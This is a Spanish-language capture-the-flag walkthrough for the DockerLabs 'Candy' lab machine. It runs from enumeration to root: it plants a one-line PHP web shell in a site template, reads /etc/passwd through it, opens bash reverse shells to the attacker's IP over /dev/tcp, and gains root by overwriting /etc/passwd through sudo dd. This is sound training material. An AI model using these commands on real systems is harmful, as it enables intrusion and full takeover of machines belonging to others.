### Candy-DockerLabs🇪🇸


#### 1. Primero vamos a encender el laboratorio y ponerlo en marcha.

```bash
sudo bash ./auto_deploy.sh candy.tar 
```

<img width="889" height="537" alt="image" src="https://github.com/user-attachments/assets/a6e19f7c-2051-480e-894a-ab3fa68c9b0b" />


#### 1.2 Vamos a realizar un ping para comprobar que está la máquina encendida.

```bash
ping -c3 172.17.0.2
```

<img width="903" height="219" alt="image" src="https://github.com/user-attachments/assets/57c1ce11-2494-4aed-9f55-87896b730882" />


#### 2. Realizamos un escaneo de puertos con nmap.

```bash
 nmap -p- -sCV 172.17.0.2
```

<img width="895" height="330" alt="image" src="https://github.com/user-attachments/assets/779b6fe4-4d38-4577-a4f3-62aac32e4d21" />


#### 3. Realizamos un gobuster para ver todos los directorios ocultos.
```bash
 gobuster dir -u http://172.17.0.2/ \
                                    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 \
                                    -x php,txt,bak
```


<img width="900" height="776" alt="image" src="https://github.com/user-attachments/assets/3fff828a-36eb-4c21-bff3-4fcca8598498" />


#### 4. Haciendo un curl para observar el archivo robots.txt podremos ver `admin:hash`.
```bash
curl -l "http://172.17.0.2/robots.txt"
```

<img width="903" height="620" alt="image" src="https://github.com/user-attachments/assets/d2fd9e1e-cfa3-4b72-babd-9f9df2d8c54f" />



#### 4.2 Vamos a nuestra web para desencriptar hashes y la encontramos.

```bash
# hash: sanluis12345
```

<img width="1014" height="545" alt="image" src="https://github.com/user-attachments/assets/f9cc59f2-d33b-4bf9-801f-efc54a58dd45" />


#### 4.3 Ahora entramos en la web con el user y password.


<img width="1019" height="995" alt="image" src="https://github.com/user-attachments/assets/1504d0bf-eb84-4abc-8b06-16d1084d16e9" />



#### 4.4 Sabiendo que el puerto ssh está cerrado debemos de buscar la manera para realizar una reverse shell desde la web. Primero vamos a templates i miramos el codigo del único que tenemos.

<img width="1017" height="929" alt="image" src="https://github.com/user-attachments/assets/c1a62233-7355-4fc6-aab0-36331a15ed07" />


#### 4.5 Vamos a la carpeta de index y modificamos la linea 143 añadiendo este código.
```bash
<?php echo system($_GET['shadow']); ?>
```

<img width="1014" height="993" alt="image" src="https://github.com/user-attachments/assets/bf63842c-a6d6-425a-b2b4-ddeb3c689717" />



#### 4.6 Ahora podremos enviar comando apartir de `shadow`, entramos a /etc/passwd.
```bash
http://172.17.0.2/?shadow=cat%20/etc/passwd
```

<img width="1023" height="445" alt="image" src="https://github.com/user-attachments/assets/eca7e368-bd2b-4d42-9c5d-244aaedbe406" />

#### 5. Ahora ponemos a escuchar una terminal, en otra vamos a crear nuestra reverse shell y lo pasamos a base64

```bash
echo "sh -i >& /dev/tcp/172.16.1.131/4444 0>&1" | base64
```

<img width="898" height="84" alt="image" src="https://github.com/user-attachments/assets/7d73ffa0-77df-48e6-a7cd-b30b23007af9" />


#### 5.2 Ya tenemos la reverse shell escuchando por `nc -nlvp 4444` y entrando a 
```bash
http://172.17.0.2/?shadow=bash+-c+%27bash+-i+%3E%26+/dev/tcp/172.17.0.1/4444+0%3E%261%27
```


<img width="880" height="158" alt="image" src="https://github.com/user-attachments/assets/16e580a4-0bdd-4a10-9a07-26f09a311b99" />


#### 6. Ahora buscaremos escalar privikegios, primero miraremos los binarios que podemos modificar.
```bash
sudo -l
find / -name "*.txt" 2>/dev/null
```

<img width="889" height="809" alt="image" src="https://github.com/user-attachments/assets/d893e0a1-320a-443b-8c72-1e3246afe6cb" />

#### 6.2 Viendo los binarios podemos ver que en `cat /var/backups/hidden/otro_caramelo.txt` podemos ver un usuario para ascender a el.


<img width="900" height="735" alt="image" src="https://github.com/user-attachments/assets/eebc36ea-cbfd-4aaa-8f6d-3483499c39bd" />



#### 6.3 Escalamos a luisillo.


<img width="904" height="661" alt="image" src="https://github.com/user-attachments/assets/896a9007-bd05-4450-bd66-c2d5e98b683e" />


#### 7. Ahora miramos sus binarios con `sudo -l`


<img width="908" height="175" alt="image" src="https://github.com/user-attachments/assets/67e49e0a-e6d3-4abf-8a81-e352c5afcf7a" />


#### 7.2 Ahora vamos a hacer un exploit modificando el `/etc/passwd` para root shell.
```bash
cat /etc/passwd > copia.txt
sed 's/x//g' copia.txt > copia_sin_x.txt
cat copia_sin_x.txt | sudo /bin/dd of=/etc/passwd
su
```

<img width="899" height="226" alt="image" src="https://github.com/user-attachments/assets/15d60744-fc6e-4895-9d48-6144b3f3c453" />













